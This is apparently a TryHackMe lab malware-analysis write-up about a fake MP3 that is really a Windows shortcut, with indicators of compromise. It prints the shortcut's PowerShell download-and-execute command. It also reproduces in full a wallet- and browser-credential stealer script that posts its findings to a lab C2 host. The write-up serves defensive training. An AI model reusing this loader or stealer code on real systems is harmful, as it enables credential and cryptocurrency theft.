# Threat Analysis Report: TryHackMe - Day1

## **Case Overview**
- **Website Involved:** All-in-One Converter
- **URL Pasted:** https://www.youtube.com/watch?v=AN_R4pR1hck
- **Files Delivered:** `download.zip` containing:
  - `song.mp3`
  - `somg.mp3`
 
## **File Details**

### **song.mp3**
- File Type: Audio file
- Metadata:
  - ID3 version 2.3.0
  - MPEG ADTS, layer III, v1
  - Bitrate: 192 kbps, 44.1 kHz, Stereo
  - Artist: Tyler Ramsbey
  - Album: Rap
  - Genre: Rock
  - Title: Mount HackIt
- No suspicious activity detected during initial inspection.
- Evidence:
```┌──(intrusus㉿attck)-[~/Downloads/TryHackMe/Day1]
└─$ file song.mp3          
song.mp3: Audio file with ID3 version 2.3.0, contains: MPEG ADTS, layer III, v1, 192 kbps, 44.1 kHz, Stereo
```
```┌──(intrusus㉿attck)-[~/Downloads/TryHackMe/Day1]
└─$ exiftool song.mp3 
ExifTool Version Number         : 13.00
File Name                       : song.mp3
Directory                       : .
File Size                       : 4.6 MB
File Modification Date/Time     : 2024:10:24 10:50:46+02:00
File Access Date/Time           : 2024:12:16 11:50:54+01:00
File Inode Change Date/Time     : 2024:12:16 11:46:49+01:00
File Permissions                : -rwxrwxr-x
File Type                       : MP3
File Type Extension             : mp3
MIME Type                       : audio/mpeg
MPEG Audio Version              : 1
Audio Layer                     : 3
Audio Bitrate                   : 192 kbps
Sample Rate                     : 44100
Channel Mode                    : Stereo
MS Stereo                       : Off
Intensity Stereo                : Off
Copyright Flag                  : False
Original Media                  : False
Emphasis                        : None
ID3 Size                        : 2176
Artist                          : Tyler Ramsbey
Album                           : Rap
Title                           : Mount HackIt
Encoded By                      : Mixcraft 10.5 Recording Studio Build 621
Year                            : 2024
Genre                           : Rock
Track                           : 0/1
Comment                         : 
Date/Time Original              : 2024
Duration                        : 0:03:11 (approx)
```

### **somg.mp3**
- File Type: Windows Shortcut (.lnk)
- Metadata:
  - **Target Path:** `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
  - **Size:** 448 KB
- Evidence:
```┌──(intrusus㉿attck)-[~/Downloads/TryHackMe/Day1]
└─$ file somg.mp3 
somg.mp3: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has Working directory, Has command line arguments, Unicoded, MachineID win-base-2019, EnableTargetMetadata KnownFolderID 1AC14E77-02E7-4E5D-B744-2EB1AE5198B7, Archive, ctime=Sat Sep 15 06:14:14 2018, atime=Sat Sep 15 06:14:14 2018, mtime=Sat Sep 15 06:14:14 2018, length=448000, window=normal, IDListSize 0x020d, Root folder "20D04FE0-3AEA-1069-A2D8-08002B30309D", Volume "C:\", LocalBasePath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
```

#### Further Analysis of somg.mp3

```┌──(intrusus㉿attck)-[~/Downloads/TryHackMe/Day1]
└─$ lnkinfo somg.mp3          
lnkinfo 20230716

Windows Shortcut information:
        Contains a link target identifier
        Contains a relative path string
        Contains a working directory string
        Contains a command line arguments string
        Number of data blocks           : 4

Link information:
        Creation time                   : Sep 15, 2018 07:14:14.454767300 UTC
        Modification time               : Sep 15, 2018 07:14:14.454767300 UTC
        Access time                     : Sep 15, 2018 07:14:14.454767300 UTC
        File size                       : 448000 bytes
        Icon index                      : 0
        Show Window value               : 0x00000001
        Hot Key value                   : 0
        File attribute flags            : 0x00000020
                Should be archived (FILE_ATTRIBUTE_ARCHIVE)
        Drive type                      : Fixed (3)
        Drive serial number             : 0xa8a4c362
        Volume label                    : 
        Local path                      : C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
        Relative path                   : ..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
        Working directory               : C:\\Windows\\System32\\WindowsPowerShell\\v1.0
        Command line arguments          : -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\\ProgramData\\s.ps1'); iex (Get-Content 'C:\\ProgramData\\s.ps1' -Raw)"

Link target identifier:
        Shell item list
                Number of items         : 7

        Shell item: 1
                Item type               : Root folder
                Class type indicator    : 0x1f (Root folder)
                Shell folder identifier : 20d04fe0-3aea-1069-a2d8-08002b30309d
                Shell folder name       : My Computer

        Shell item: 2
                Item type               : Volume
                Class type indicator    : 0x2f (Volume)
                Volume name             : C:\

        Shell item: 3
                Item type               : File entry
                Class type indicator    : 0x31 (File entry: Directory)
                Name                    : Windows
                Modification time       : May 17, 2023 19:45:40
                File attribute flags    : 0x00000010
                        Is directory (FILE_ATTRIBUTE_DIRECTORY)
        Extension block: 1
                Signature               : 0xbeef0004 (File entry extension)
                Long name               : Windows
                Creation time           : Sep 15, 2018 06:09:28
                Access time             : May 17, 2023 19:45:40
                NTFS file reference     : MFT entry: 986, sequence: 1

        Shell item: 4
                Item type               : File entry
                Class type indicator    : 0x31 (File entry: Directory)
                Name                    : System32
                Modification time       : Oct 30, 2024 14:10:32
                File attribute flags    : 0x00000010
                        Is directory (FILE_ATTRIBUTE_DIRECTORY)
        Extension block: 1
                Signature               : 0xbeef0004 (File entry extension)
                Long name               : System32
                Creation time           : Sep 15, 2018 06:09:28
                Access time             : Oct 30, 2024 14:10:32
                NTFS file reference     : MFT entry: 30079, sequence: 1

        Shell item: 5
                Item type               : File entry
                Class type indicator    : 0x31 (File entry: Directory)
                Name                    : WindowsPowerShell
                Modification time       : Sep 15, 2018 07:19:02
                File attribute flags    : 0x00000010
                        Is directory (FILE_ATTRIBUTE_DIRECTORY)
        Extension block: 1
                Signature               : 0xbeef0004 (File entry extension)
                Long name               : WindowsPowerShell
                Creation time           : Sep 15, 2018 07:19:02
                Access time             : Sep 15, 2018 07:19:02
                NTFS file reference     : MFT entry: 31432, sequence: 1

        Shell item: 6
                Item type               : File entry
                Class type indicator    : 0x31 (File entry: Directory)
                Name                    : v1.0
                Modification time       : Sep 15, 2018 09:07:34
                File attribute flags    : 0x00000010
                        Is directory (FILE_ATTRIBUTE_DIRECTORY)
        Extension block: 1
                Signature               : 0xbeef0004 (File entry extension)
                Long name               : v1.0
                Creation time           : Sep 15, 2018 07:19:02
                Access time             : Sep 15, 2018 09:07:34
                NTFS file reference     : MFT entry: 31433, sequence: 1

        Shell item: 7
                Item type               : File entry
                Class type indicator    : 0x32 (File entry: File)
                Name                    : powershell.exe
                Modification time       : Sep 15, 2018 07:14:16
                File attribute flags    : 0x00000020
                        Should be archived (FILE_ATTRIBUTE_ARCHIVE)
        Extension block: 1
                Signature               : 0xbeef0004 (File entry extension)
                Long name               : powershell.exe
                Creation time           : Sep 15, 2018 07:14:16
                Access time             : Sep 15, 2018 07:14:16
                NTFS file reference     : MFT entry: 203979, sequence: 1

Data block: 1
        Signature                       : 0xa0000005 (Special folder location)

Data block: 2
        Signature                       : 0xa000000b (Known folder location)

Data block: 3
        Signature                       : 0xa0000003 (Distributed link tracker properties)
        Machine identifier              : win-base-2019
        Droid volume identifier         : f6953da0-d6bb-4c14-8dd4-1d39a7683054
        Droid file identifier           : 1be092cd-96c8-11ef-82da-02a0a1a4abe5
        Birth droid volume identifier   : f6953da0-d6bb-4c14-8dd4-1d39a7683054
        Birth droid file identifier     : 1be092cd-96c8-11ef-82da-02a0a1a4abe5

Data block: 4
        Signature                       : 0xa0000009 (Metadata property store)
        {dabd30ed-0043-4789-a7f8-d013a4736622}/100 (PKEY_ItemFolderPathDisplayNarrow)
                Value (0x001f)          : v1.0 (C:\Windows\System32\WindowsPowerShell)

        {46588ae2-4cbc-4338-bbfc-139326986dce}/4 (Unknown)
                Value (0x001f)          : S-1-5-21-1966530601-3185510712-10604624-500

        {b725f130-47ef-101a-a5f1-02608c9eebac}/10 (PKEY_ItemNameDisplay)
                Value (0x001f)          : powershell.exe

        {b725f130-47ef-101a-a5f1-02608c9eebac}/15 (PKEY_DateCreated)
                Value (0x0040)          : Sep 15, 2018 07:14:16.000000000 UTC

        {b725f130-47ef-101a-a5f1-02608c9eebac}/12 (Unknown)
                Value (0x0015)          : 448000

        {b725f130-47ef-101a-a5f1-02608c9eebac}/4 (PKEY_ItemTypeText)
                Value (0x001f)          : Application

        {b725f130-47ef-101a-a5f1-02608c9eebac}/14 (PKEY_DateModified)
                Value (0x0040)          : Sep 15, 2018 07:14:14.454767300 UTC

        {28636aa6-953d-11d2-b5d6-00c04fd918d0}/30 (PKEY_ParsingPath)
                Value (0x001f)          : C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe

        {446d16b1-8dad-4870-a748-402ea43d788c}/104 (System.VolumeId)
                Value (0x0048)          : 19127295-0000-0000-0000-100000000000
```
- The `.lnk` file targets the PowerShell executable and uses encoded commands to bypass execution policies and download a malicious script (`IS.ps1`) from:
  - **URL:** `https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1`
- The script is saved locally to `C:\ProgramData\s.ps1` and executed using `iex` (Invoke-Expression).
- Execution Policy: **Bypass**
- PowerShell Command: Creates a WebClient object to download a malicious payload and executes it directly.
- The URL in the PowerShell command indicates an attempt to connect to GitHub for payload delivery. Further inspection is needed to analyze `IS.ps1`.

## **PowerShell Script Analysis**
```powershell                       
function Print-AsciiArt {
    Write-Host "  ____     _       ___  _____    ___    _   _ "
    Write-Host " / ___|   | |     |_ _||_   _|  / __|  | | | |"  
    Write-Host "| |  _    | |      | |   | |   | |     | |_| |"
    Write-Host "| |_| |   | |___   | |   | |   | |__   |  _  |"
    Write-Host " \____|   |_____| |___|  |_|    \___|  |_| |_|"

    Write-Host "         Created by the one and only M.M."
}

# Call the function to print the ASCII art
Print-AsciiArt

# Path for the info file
$infoFilePath = "stolen_info.txt"

# Function to search for wallet files
function Search-ForWallets {
    $walletPaths = @(
        "$env:USERPROFILE\.bitcoin\wallet.dat",
        "$env:USERPROFILE\.ethereum\keystore\*",
        "$env:USERPROFILE\.monero\wallet",
        "$env:USERPROFILE\.dogecoin\wallet.dat"
    )
    Add-Content -Path $infoFilePath -Value "`n### Crypto Wallet Files ###"
    foreach ($path in $walletPaths) {
        if (Test-Path $path) {
            Add-Content -Path $infoFilePath -Value "Found wallet: $path"
        }
    }
}

# Function to search for browser credential files (SQLite databases)
function Search-ForBrowserCredentials {
    $chromePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json"

    Add-Content -Path $infoFilePath -Value "`n### Browser Credential Files ###"
    if (Test-Path $chromePath) {
        Add-Content -Path $infoFilePath -Value "Found Chrome credentials: $chromePath"
    }
    if (Test-Path $firefoxPath) {
        Add-Content -Path $infoFilePath -Value "Found Firefox credentials: $firefoxPath"
    }
}

# Function to send the stolen info to a C2 server
function Send-InfoToC2Server {
    $c2Url = "http://papash3ll.thm/data"
    $data = Get-Content -Path $infoFilePath -Raw

    # Using Invoke-WebRequest to send data to the C2 server
    Invoke-WebRequest -Uri $c2Url -Method Post -Body $data
}

# Main execution flow
Search-ForWallets
Search-ForBrowserCredentials
Send-InfoToC2Server
```
### **1. Overview**
The PowerShell script (`IS.ps1`) is designed to:
- Search for cryptocurrency wallet files.
- Locate browser credential files.
- Exfiltrate collected data to a Command and Control (C2) server.

### **2. Detailed Functions**
#### **Search-ForWallets**
- **Purpose:** Locates wallet files for popular cryptocurrencies such as Bitcoin, Ethereum, Monero, and Dogecoin.
- **Target Paths:**
  - `$env:USERPROFILE\.bitcoin\wallet.dat`
  - `$env:USERPROFILE\.ethereum\keystore\*`
  - `$env:USERPROFILE\.monero\wallet`
  - `$env:USERPROFILE\.dogecoin\wallet.dat`

#### **Search-ForBrowserCredentials**
- **Purpose:** Identifies browser credential storage files for Chrome and Firefox.
- **Target Paths:**
  - Chrome: `$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data`
  - Firefox: `$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json`

#### **Send-InfoToC2Server**
- **Purpose:** Reads the collected data from `stolen_info.txt` and sends it to the C2 server.
- **C2 URL:** `http://papash3ll.thm/data`

### **3. Execution Flow**
1. Calls `Search-ForWallets` to locate wallet files and logs findings.
2. Calls `Search-ForBrowserCredentials` to locate credential files and logs findings.
3. Calls `Send-InfoToC2Server` to exfiltrate the collected data.

## **Indicators of Compromise (IOCs)**
### **File System Artifacts**
- `stolen_info.txt` in the current working directory.
- Searched wallet file paths:
  - Bitcoin: `wallet.dat`
  - Ethereum: `keystore`
  - Monero: `wallet`
  - Dogecoin: `wallet.dat`
- Browser credential file paths:
  - Chrome: `Login Data`
  - Firefox: `logins.json`

### **Network Artifacts**
- C2 URL: `http://papash3ll.thm/data`
